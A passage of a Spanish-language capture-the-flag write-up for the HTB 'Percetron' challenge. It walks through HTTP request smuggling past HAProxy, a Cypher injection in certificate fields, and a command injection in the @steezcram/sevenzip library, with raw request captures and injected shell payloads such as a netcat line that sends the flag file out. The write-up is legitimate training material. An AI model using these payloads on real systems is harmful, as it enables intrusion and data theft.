src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-3.webp"></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/app # tcpdump -i lo tcp port 3000 -w -
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
e0JE&lt;@@8
        HR&gt;0
]'e0JE&lt;@@&lt;
          4~HR?0
]']'e0BE4@@8
            HR?4~р(
]']'e-1@E2@@7
             HR?4~р&
]']'POST /panel/login HTTP/1.1
host: 127.0.0.1:1337
transfer-encoding: chunked

A3
GET /healthcheck-dev HTTP/1.1
Host: 127.0.0.1:3000
Cookie: connect.sid=s%3AlPQ3OEP-p97KH2kOWLgzS5zV6lJ75683.sfnADEVOu%2BufjwtP8W%2B8vY7kfgcQpUU83EqY%2FXeMLL0


0

e11BE4@@~
         4~HS=(
]']'eE@@y\
          4~HS=
]']'HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 1060
ETag: W/"424-qLUzAi9KX/2MAcYPkCsictUtg4A"
Set-Cookie: connect.sid=s%3ADqxxBDsaqUZrSzTnEtkGlrVLO89b8KBY.k1WTa8T5CRYcxOKL1mcjRoI4GZXtcq2YSDsIAvKOQUk; Path=/; HttpOnly  
Date: Thu, 14 Mar 2024 12:24:53 GMT
Connection: keep-alive
Keep-Alive: timeout=5

&lt;html&gt;
&lt;head&gt;&lt;title&gt;Error: Missing parameters&lt;/title&gt;&lt;meta charset="utf-8"&gt;
&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
&lt;link rel="shortcut icon" type="image/jpeg" href="icon"&gt;
&lt;link rel="stylesheet" href="/static/css/bootstrap.min.css"&gt;
&lt;link rel="stylesheet" href="/static/css/line-awesome.min.css"&gt;
&lt;link rel="stylesheet" href="/static/css/main.css"&gt;
&lt;link rel="stylesheet" href="/static/css/sidebar.css"&gt;
&lt;link rel="stylesheet" href="/static/css/topnav.css"&gt;
&lt;script src="/static/js/bootstrap.bundle.min.js"&gt;&lt;/script&gt;
&lt;script src="/static/js/main.js"&gt;&lt;/script&gt;
&lt;script src="/static/js/sidebar.js"&gt;&lt;/script&gt;&lt;/head&gt;
&lt;body&gt;
&lt;div class="container center"&gt;
&lt;div class="row"&gt;
&lt;div class="col-md-6 offset-md-3"&gt;
&lt;div class="card p-4 jumbotron"&gt;
&lt;h3&gt;Error&lt;/h3&gt;&lt;p&gt;Missing parameters&lt;/p&gt;&lt;div class="btn-group btn-block"&gt;
&lt;button class="btn primaryBtn mt-4" onclick="window.history.back();"&gt;Back&lt;/button&gt;
&lt;button class="btn primaryBtn mt-4" onclick="window.location.href='/'"&gt;Home&lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/htmlehBE4@@8
              S=4W(
]']'eCE5@@~
           4WHS=)
]']'&gt;eBE4@@8
            HS=4X(
]']'eBE4@@~
           4XHS=(
];$]'eE4@@8
           HS=4Y(
];%];$e&BE4@@~
              4YHS&gt;(
</code></pre></div><p>Es un poco extraño de leer, pero vemos que HA-Proxy está transformando nuestra petición HTTP a <code>Transfer-Encoding: chunked</code>. Esto podría suceder porque la cabecera <code>Content-Length</code> no se lee debido a la cabecera vacía.</p><p>Después de muchas pruebas, decidí probar HTTP/1.0, que también se mencionaba en el <a target="_blank" href="https://git.haproxy.org/?p=haproxy.git;a=commitdiff;h=a8598a2"><em>issue</em> de Git</a>, ¡y el ataque de HTTP <em>request smuggling</em> funcionño!</p><p><img alt="Percetron 4" src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-4.webp"></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">``POST /panel/login HTTP/1.0
host: 127.0.0.1:1337
connection: keep-alive

GET /healthcheck-dev HTTP/1.1
Host: 127.0.0.1:3000
Cookie: connect.sid=s%3AlPQ3OEP-p97KH2kOWLgzS5zV6lJ75683.sfnADEVOu%2BufjwtP8W%2B8vY7kfgcQpUU83EqY%2FXeMLL0

BE4NX@@i
        u(
ENY@@
     u
``HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 1060
ETag: W/"424-qLUzAi9KX/2MAcYPkCsictUtg4A"
Set-Cookie: connect.sid=s%3AIENOwcfX7YCod4ZfWpGZb2vV62Muyt4y.zceAhjNahxv0jbgMlDLUo3%2FFj0Dk6xm1BpTmTbrmbuE; Path=/; HttpOnly  
Date: Thu, 14 Mar 2024 12:28:35 GMT
Connection: keep-alive
Keep-Alive: timeout=5

&lt;html&gt;
&lt;head&gt;&lt;title&gt;Error: Missing parameters&lt;/title&gt;&lt;meta charset="utf-8"&gt;
&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
&lt;link rel="shortcut icon" type="image/jpeg" href="icon"&gt;
&lt;link rel="stylesheet" href="/static/css/bootstrap.min.css"&gt;
&lt;link rel="stylesheet" href="/static/css/line-awesome.min.css"&gt;
&lt;link rel="stylesheet" href="/static/css/main.css"&gt;
&lt;link rel="stylesheet" href="/static/css/sidebar.css"&gt;
&lt;link rel="stylesheet" href="/static/css/topnav.css"&gt;
&lt;script src="/static/js/bootstrap.bundle.min.js"&gt;&lt;/script&gt;
&lt;script src="/static/js/main.js"&gt;&lt;/script&gt;
&lt;script src="/static/js/sidebar.js"&gt;&lt;/script&gt;&lt;/head&gt;
&lt;body&gt;
&lt;div class="container center"&gt;
&lt;div class="row"&gt;
&lt;div class="col-md-6 offset-md-3"&gt;
&lt;div class="card p-4 jumbotron"&gt;
&lt;h3&gt;Error&lt;/h3&gt;&lt;p&gt;Missing parameters&lt;/p&gt;&lt;div class="btn-group btn-block"&gt;
&lt;button class="btn primaryBtn mt-4" onclick="window.history.back();"&gt;Back&lt;/button&gt;
&lt;button class="btn primaryBtn mt-4" onclick="window.location.href='/'"&gt;Home&lt;/button&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
BE4!@@eeS
       u(
CE5NZ@@f
        u)
BE4"@@e
       u(
``se\e^EPN[@@J
              uD
`
 `HTTP/1.1 400 Bad Request
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 41
ETag: W/"29-pbacTK67vUwlSvfPQwByciu+4gI"
Date: Thu, 14 Mar 2024 12:28:35 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"message":"Mandatory URL not specified"segeBE4#@@e
                                                   u4(
`
 `
  seeBE4$@@e
            u4(
`
 `
  seeBE4%@@e
            u4(
</code></pre></div><p>Este enfoque realmente funcionó porque no hay <code>Transfer-Encoding: chunked</code> en HTTP/1.0, por lo que el HA-Proxy simplemente reenvía toda la petición a Express, que toma el primer bloque como una petición vacía y luego procesa el segundo bloque.</p><p>En este punto, podemos tomar el <em>payload</em> de Gopher / MongoDB anterior y usarlo para insertar un usuario <code>administrator</code> en la instancia remota del reto (necesitamos usar doble codificación de URL):</p><p><img alt="Percetron 5" src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-5.webp"></p><p>Y en este punto estamos como <code>administrator</code> (obsérvese que tenemos una pestaña &ldquo;<em>Management</em>&rdquo;):</p><p><img alt="Percetron 6" src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-6.webp"></p><p><img alt="Percetron 7" src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-7.webp"></p><h2 id="obteniendo-rce">Obteniendo RCE</h2><p>Ahora que hemos completado la primera parte, debemos echar un vistazo a lo que falta para resolver el reto. Nos vemos obligados a conseguir la ejecución remota de comandos (RCE) porque el nombre de archivo de la <em>flag</em> se aleatoriza en <code>entrypoint.sh</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3"># Change flag name</span>
<span class="mtk8">mv</span><span class="mtk1"> </span><span class="mtk4">/flag.txt</span><span class="mtk1"> </span><span class="mtk4">/flag$(</span><span class="mtk8">cat</span><span class="mtk4"> /dev/urandom </span><span class="mtk5">|</span><span class="mtk4"> </span><span class="mtk8">tr</span><span class="mtk4"> </span><span class="mtk6">-cd</span><span class="mtk4"> "a-f0-9" </span><span class="mtk5">|</span><span class="mtk4"> </span><span class="mtk8">head</span><span class="mtk4"> </span><span class="mtk6">-c</span><span class="mtk4"> </span><span class="mtk6">10</span><span class="mtk4">).txt</span>  
</code></pre></div><p>Con permisos de <code>administrator</code>, podemos añadir nuevos certificados:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">"/panel/management/addcert"</span><span class="mtk1">, adminMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">pem</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.pem;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">pubKey</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.pubKey;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">privKey</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">.privKey;</span>
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk1">pem</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">pubKey</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk1">privKey</span><span class="mtk1">)) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"error"</span><span class="mtk1">, {</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Missing parameters"</span><span class="mtk1">});</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Neo4jConnection</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">certCreated</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">addCertificate</span><span class="mtk1">({</span><span class="mtk4">"cert"</span><span class="mtk1">: </span><span class="mtk1">pem</span><span class="mtk1">, </span><span class="mtk4">"pubKey"</span><span class="mtk1">: </span><span class="mtk1">pubKey</span><span class="mtk1">, </span><span class="mtk4">"privKey"</span><span class="mtk1">: </span><span class="mtk1">privKey</span><span class="mtk1">});</span>  

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">certCreated</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"error"</span><span class="mtk1">, {</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Could not add certificate"</span><span class="mtk1">});</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">"/panel/management"</span><span class="mtk1">);</span>
<span class="mtk1">});</span>
</code></pre></div><p>Aquí, el servidor interactúa con neo4j en la función <code>addCertificate</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">addCertificate</span><span class="mtk1">(</span><span class="mtk9 mtki">cert</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">certPath</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">(</span><span class="mtk9">this</span><span class="mtk1">.certDir, </span><span class="mtk8">randomHex</span><span class="mtk1">(</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">".cert"</span><span class="mtk1">);</span>  
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">certInfo</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">parseCert</span><span class="mtk1">(</span><span class="mtk9 mtki">cert</span><span class="mtk1">.cert);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">certInfo</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">insertCertQuery</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`</span>
<span class="mtk4">      CREATE (:Certificate {</span>
<span class="mtk4">          common_name: '</span><span class="mtk5">${</span><span class="mtk1">certInfo</span><span class="mtk1">.</span><span class="mtk1">issuer</span><span class="mtk1">.commonName</span><span class="mtk5">}</span><span class="mtk4">',</span>
<span class="mtk4">          file_name: '</span><span class="mtk5">${</span><span class="mtk1">certPath</span><span class="mtk5">}</span><span class="mtk4">',</span>
<span class="mtk4">          org_name: '</span><span class="mtk5">${</span><span class="mtk1">certInfo</span><span class="mtk1">.</span><span class="mtk1">issuer</span><span class="mtk1">.organizationName</span><span class="mtk5">}</span><span class="mtk4">',</span>
<span class="mtk4">          locality_name: '</span><span class="mtk5">${</span><span class="mtk1">certInfo</span><span class="mtk1">.</span><span class="mtk1">issuer</span><span class="mtk1">.localityName</span><span class="mtk5">}</span><span class="mtk4">',</span>
<span class="mtk4">          state_name: '</span><span class="mtk5">${</span><span class="mtk1">certInfo</span><span class="mtk1">.</span><span class="mtk1">issuer</span><span class="mtk1">.stateOrProvinceName</span><span class="mtk5">}</span><span class="mtk4">',</span>
<span class="mtk4">          country_name: '</span><span class="mtk5">${</span><span class="mtk1">certInfo</span><span class="mtk1">.</span><span class="mtk1">issuer</span><span class="mtk1">.countryName</span><span class="mtk5">}</span><span class="mtk4">'</span>
<span class="mtk4">      });</span>
<span class="mtk4">    `</span><span class="mtk1">;</span>
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk9">this</span><span class="mtk1">.</span><span class="mtk8">runQuery</span><span class="mtk1">(</span><span class="mtk1">insertCertQuery</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8 mtku">fs</span><span class="mtk1">.</span><span class="mtk8">writeFileSync</span><span class="mtk1">(</span><span class="mtk1">certPath</span><span class="mtk1">, </span><span class="mtk9 mtki">cert</span><span class="mtk1">.cert);</span>
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
<span class="mtk1">    } </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">error</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>
<span class="mtk1">  }</span>
</code></pre></div><h3 id="inyección-cypher-neo4j">Inyección Cypher (neo4j)</h3><p>Como se puede ver, podemos indicar muchos atributos de un certificado PKI que será administrado por neo4j, que es una base de datos basada en grafos. Pero hay una inyección (conocida como inyección Cypher, que lleva el nombre del lenguaje neo4j) porque podemos insertar cualquier cadena (similar a una inyección SQL). Para obtener más información, puede echar un vistazo a <a target="_blank" href="https://pentester.land/blog/cypher-injection-cheatsheet/">Pentester Land</a>.</p><p>La clave aquí es que podemos controlar el atributo <code>file_name</code> del certificado inyectando dentro de <code>common_name</code>. Una vez que tenemos una escritura arbitraria de archivo, podemos usar <code>/panel/management/dl-certs</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"/panel/management/dl-certs"</span><span class="mtk1">, adminMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Neo4jConnection</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">certificates</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">getAllCertificates</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">dirsArray</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [];</span>
<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk1">certificates</span><span class="mtk1">.length; </span><span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">cert</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">certificates</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">];</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">filename</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">cert</span><span class="mtk1">.file_name;</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">absolutePath</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk1">__dirname</span><span class="mtk1">, </span><span class="mtk1">filename</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">fileDirectory</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">dirname</span><span class="mtk1">(</span><span class="mtk1">absolutePath</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk1">dirsArray</span><span class="mtk1">.</span><span class="mtk8">push</span><span class="mtk1">(</span><span class="mtk1">fileDirectory</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk1">dirsArray</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk5">...new</span><span class="mtk1"> </span><span class="mtk7 mtki">Set</span><span class="mtk1">(</span><span class="mtk1">dirsArray</span><span class="mtk1">)];</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">zipArray</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [];</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">madeError</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk1">dirsArray</span><span class="mtk1">.</span><span class="mtk1">length</span><span class="mtk1">; </span><span class="mtk1">i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">madeError</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>

<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">dir</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">dirsArray</span><span class="mtk1">[</span><span class="mtk1">i</span><span class="mtk1">];</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">zipName</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"/tmp/"</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">randomHex</span><span class="mtk1">(</span><span class="mtk6">16</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">".zip"</span><span class="mtk1">;</span>

<span class="mtk1">        sevenzip.</span><span class="mtk8">compress</span><span class="mtk1">(</span><span class="mtk4">"zip"</span><span class="mtk1">, {</span><span class="mtk1">dir</span><span class="mtk1">: </span><span class="mtk1">dir</span><span class="mtk1">, </span><span class="mtk1">destination</span><span class="mtk1">: </span><span class="mtk1">zipName</span><span class="mtk1">, </span><span class="mtk1">is64</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1">}, () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {}).</span><span class="mtk8">catch</span><span class="mtk1">(() </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>  
<span class="mtk1">            </span><span class="mtk1">madeError</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
<span class="mtk1">        })</span>
<span class="mtk1">       </span>
<span class="mtk1">        </span><span class="mtk1">zipArray</span><span class="mtk1">.</span><span class="mtk8">push</span><span class="mtk1">(</span><span class="mtk1">zipName</span><span class="mtk1">);  </span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">madeError</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk4">"error"</span><span class="mtk1">, {</span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"Error compressing files"</span><span class="mtk1">});</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">zipArray</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">});</span>
</code></pre></div><p>Este <em>endpoint</em> toma todos los certificados disponibles de neo4j y utiliza una librería externa llamada <code>@steezcram/sevenzip</code> para comprimir todos los certificados en un archivo ZIP. Sin embargo, es extraño que el servidor no permita descargar el archivo ZIP&mldr; Solo muestra el valor de <code>zipArray</code>, que contiene una lista con los diferentes nombres de archivos ZIP.</p><p>Aquí, comenzamos a pensar en aluna manera en la que podríamos usar la inyección Cypher para realizar peticiones <em>out-of-band</em> y exfiltrar la <em>flag</em>, o incluso el archivo ZIP. Este enfoque no era muy asequible, porque la <em>flag</em> está en el directorio <code>/</code>, por lo que el servidor debería comprimir todo el sistema de archivos&mldr;</p><h3 id="inyección-de-comandos">Inyección de comandos</h3><p>Mientras buscábamos vulnerabilidades de <code>@steezcram/sevenzip</code>, descubrimos que es un proyecto GitHub de baja popularidad, solo tenía 7 estrellas. Entonces, puede haber alguna vulnerabilidad aquí.</p><p>De hecho, descubrimos que usa <code>child_process.execFile</code> con <code>shell = true</code>, entonces podríamos inyectar comandos.</p><p><img alt="Percetron 8" src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-8.webp"></p><p><img alt="Percetron 9" src="/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-9.webp"></p><p>Podemos probar un <em>payload</em> de inyección de comandos simple dentro del contenedor de Docker para ver cómo se crea el comando:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/app # node
Welcome to Node.js v16.20.2.
Type ".help" for more information.
&gt; const sevenzip = require("@steezcram/sevenzip");
<span class="code-grey">undefined</span>
&gt; sevenzip.compress("zip", {dir: '/app; nc 0 4444 &lt; /fl*', destination: '/tmp/file.zip', is64: true}, () =&gt; {})
Promise {
  <span class="code-dark-cyan">&lt;pending&gt;</span>,
  [<span class="code-dark-green">Symbol(async_id_symbol)</span>]: <span class="code-dark-yellow">617</span>,
  [<span class="code-dark-green">Symbol(trigger_async_id_symbol)</span>]: <span class="code-dark-yellow">5</span>
}
&gt; Uncaught:
Error: Command failed: /app/node_modules/7zip-bin/linux/x64/7za a -tzip "/tmp/file.zip" "/app; nc 0 4444 &lt; /fl*" -mm=Deflate64 -bsp1  
/bin/sh: /app/node_modules/7zip-bin/linux/x64/7za: Permission denied

<span class="code-grey">    at __node_internal_genericNodeError (node:internal/errors:857:15)</span>
<span class="code-grey">    at ChildProcess.exithandler (node:child_process:402:12)</span>
<span class="code-grey">    at ChildProcess.emit (node:events:513:28)</span>
<span class="code-grey">    at ChildProcess.emit (node:domain:552:15)</span>
<span class="code-grey">    at maybeClose (node:internal/child_process:1100:16)</span>
<span class="code-grey">    at Socket.&lt;anonymous&gt; (node:internal/child_process:458:11)</span>
<span class="code-grey">    at Socket.emit (node:events:513:28)</span>
<span class="code-grey">    at Socket.emit (node:domain:552:15)</span> {
  code: <span class="code-dark-yellow">126</span>,
  killed: <span class="code-dark-yellow">false</span>,
  signal: <span class="code-white">null</span>,
  cmd: <span class="code-dark-green">'/app/node_modules/7zip-bin/linux/x64/7za a -tzip "/tmp/file.zip" "/app; nc 0 4444 &lt; /fl*" -mm=Deflate64 -bsp1'</span>
}
</code></pre></div><p>Entonces, sabemos cómo inyectar un comando. Podemos probarlo usando <code>curl</code> y <code>nc</code> en otra <em>shell</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt; sevenzip.compress("zip", {dir: '";curl 127.0.0.1;"', destination: '/tmp/file.zip', is64: true}, () =&gt; {})  
Promise {
  <span class="code-dark-cyan">&lt;pending&gt;</span>,
  [<span class="code-dark-green">Symbol(async_id_symbol)</span>]: <span class="code-dark-yellow">1779</span>,
  [<span class="code-dark-green">Symbol(trigger_async_id_symbol)</span>]: <span class="code-dark-yellow">5</span>
}
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/app # nc -nlvp 80
Listening on [0.0.0.0] (family 0, port 80)  
Connection from 127.0.0.1 60554 received!
GET / HTTP/1.1
Host: 127.0.0.1
User-Agent: curl/7.70.0
Accept: */*
